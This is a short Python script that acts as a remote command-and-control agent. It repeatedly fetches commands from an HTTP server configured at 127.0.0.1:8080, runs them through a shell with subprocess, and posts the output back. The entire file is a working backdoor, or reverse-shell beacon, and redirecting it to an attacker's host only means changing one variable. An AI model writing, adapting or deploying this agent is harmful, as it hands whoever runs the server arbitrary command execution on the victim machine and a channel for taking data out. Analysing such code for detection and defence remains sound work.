import urllib.request as request
from urllib import parse
import subprocess
import time

server_ip = "127.0.0.1"
server_port = 8080
base_url = f'http://{server_ip}:{server_port}'

def send_post(data, endpoint='/'):
    data = parse.urlencode({"response": data}).encode()
    request.urlopen(request.Request(f"{base_url}{endpoint}", data=data))

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    send_post(process.stdout.read() + process.stderr.read())

while True:
    command = request.urlopen(base_url).read().decode().strip()
    run_command(command)
    time.sleep(1)